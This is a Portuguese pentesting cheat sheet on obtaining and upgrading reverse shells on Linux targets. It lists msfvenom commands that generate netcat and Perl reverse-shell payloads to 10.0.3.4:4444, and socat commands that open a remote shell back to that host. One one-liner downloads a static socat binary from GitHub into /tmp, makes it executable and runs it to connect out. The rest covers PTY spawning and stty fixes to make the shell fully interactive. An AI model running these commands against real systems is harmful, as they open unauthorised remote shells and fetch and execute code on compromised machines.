---
tags:
  - comandos
  - linux
  - utilitário
  - shell
  - tty
  - bash
date: 2025-03-30T14:32:00
author: Samuel Cardoso
cssclasses:
  - center-images
  - center-titles
---

# 🖥️ Programas com Shells comuns**

> 📌 **Descrição:**  
> Quando pegamos uma Reverse Shell simples, nem todos os recursos ficam liberados e disponíveis. Isto faz com que os demais processos relacionados ao Pentest demorem mais. Alguns dos recursos limitados são:
> - STDERR não é mostrado
> - Não é possível usar VIM
> - Comandos como `su` ou `ssh` não são acessíveis
> - Sem controle sobre histórico, tab-complete, etc

---

## 📂 **1. Gerando uma Reverse Shell com msfvenom

#### 1.1. Gerando reverse com Netcat

```bash
msfvenom -p cmd/unix/reverse_netcat LHOST=10.0.3.4 LPORT=4444 R
```

#### 1.2. Gerando reverse com Perl

```bash
msfvenom -p cmd/unix/reverse_perl LHOST=10.0.3.4 LPORT=4444 R
```

---
# 🐚 2. Upgrading Shell

#### 2.1. Upgrading Shell com Python

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

#### 2.2. Upgrading Shell com Socat

Na máquina Kali:

```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

Na máquina alvo:

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

Se o `socat` não estiver instalado, podemos tentar executar o upgrade enquanto baixamos o `socat` pelo github

```bash
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

#### 2.3. Upgrading Shell com Netcat/Magic

Comaçamos chamando um PTY como no primeiro comando, mas deixamos ele em segundo plano usando o `CTRL+Z`

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Agora, vamos visualizar as configurações atuais do STTY para que consigamos deixar ambos estejam equivalentes

```bash
echo $TERM
stty -a
```

Enquanto o STTY ainda está em background, vamos definir a STTY atual para `raw`

```bash
stty raw -echo
```

agora execute os dois comandos

```bash
fg
reset
```

por final, fazendo o STTY que voltou com o `fg` equivaler ao STTY do Kali

```bash
export SHELL=bash
export TERM=xterm256-color
stty rows 38 columns 116
```

Em resumo:

```bash
# In reverse shell
python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
stty raw -echo
fg

# In reverse shell
reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>
```

---
